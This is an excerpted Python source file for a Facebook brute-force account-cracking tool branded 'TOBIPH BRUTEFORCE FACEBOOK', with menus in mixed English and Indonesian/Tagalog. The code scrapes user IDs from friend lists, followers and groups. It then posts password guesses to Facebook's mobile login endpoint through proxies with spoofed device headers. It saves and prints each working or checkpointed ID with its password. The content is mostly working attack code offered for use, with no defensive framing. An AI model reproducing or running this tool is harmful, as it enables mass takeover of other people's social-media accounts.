...
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies have become fashionable ')
		time.sleep(2)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	#print (h+'[!] Lesensi Kamu \033[1;33m:',api,)
    
     
	print('')
	print(f'''
 {p}* TOBIPH BRUTEFORCE FACEBOOK
 {b}* TobiPHcheat
 {u}* https://github.com/TobiPHcheat
 * https://www.facebook.com/TOBI.PHcheat.ph
 * https://pirmansx.waper.com{k}
.======================.
|  {h}GET ID FROM.....{k}    |
|======================'
| {u}01{k} | FRIENDLIST
| {u}02{k} | FOLLOWER LIST
| {u}03{k} | CRACK RESULT
| {u}00{k} | GO OUT bobo ka
'======================'
''')
	...
	if _____alvino__adijaya_____ in ['1','01']:
		...
		print('Choose the right one dahil bobo ka ')
		back()
def error():
	print(f'feature is still under development🤓✌️')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('[1] TobiPHcheat CP king ')
	print('[2] TobiPHcheat OK king ')
	print('[3] TobiPHcheat out	')
	kz = input('\n[!] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('Your file not found bobo')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('TOBI.C.E.O KING  CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
		...
		print('Choose the Right Cock TOBI')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('[!] How much ID TO CRACK TOBI? : '))
	except ValueError:
		print('[×] TobiPHcheat king, Even the letter f ')
		exit()
	if jum<1 or jum>100:
...
def lah():
	print("\r"+balmond+m+" \x1b[1;95mTotal ID The Collected :\x1b[1;97m "+str(len(id))+"                     ")
	input(balmond+m +"\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m If you want to directly crack !!")
	pass
	setting()
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> Enter Group Idz :\x1b[1;94m ")
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94mIf Stop, Airplane Mode 5 Seconds")
	print(balmond+m+" \x1b[1;94mCollecting ID")
	print(balmond+m+" \x1b[1;94mPress CTRL + C To Stop")
	while True:
		try:
			...
			for g in bf2:
				css = str(g).split('>')
				if 'View More Posts</span' in css:
			...
			for cari in tes:
				...
				if 'submit' in spl:
					...
					namayou = liatnih.replace(' asking question .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Process of Retrieving ID"+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Collect ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Choose the Right Cock {x}')
			time.sleep(3)
			back()
...
''')
	...
	if hu in ['1','01']:
		...
		print(' Choose the Right CMD TOBI')
		exit()
	print(f'''
.================.
| {u}01{k} | Mobile
...
''')
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('Add Password manually (y/n): ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print (f'\033[1;31mEnter an additional password of at least 6 characters\nExample :{h}TOBI11234,TOBI PHcheat,TOBI22312')
		pwku=input(f'{p}>> Enter Additional Password :{h} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
''')
	print(f'\n#-----------[ Sedang Crack ]-----------#')
	print('')
	print(f'{h}# Results {h}☣️ OK{x} Saved in : {h}OK/%s {x}'%(okc))
	print(f'{k}# Results {k}☢️ CP{x} Saved in : {k}CP/%s {x}'%(cpc))
	print(f'# Play Airplane Mode Every{m}1k{x} Idz\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rXCRACK {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent':uas_nokiax20,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			...
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent':uas_nokiax20,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}╭── Check Point ───────────────\n│ ID : {idf}\n│ PASSWORD : {pw}\n│ ua : {ua}{N}\n╰─────────────────────────────\n')
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> TobiPH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
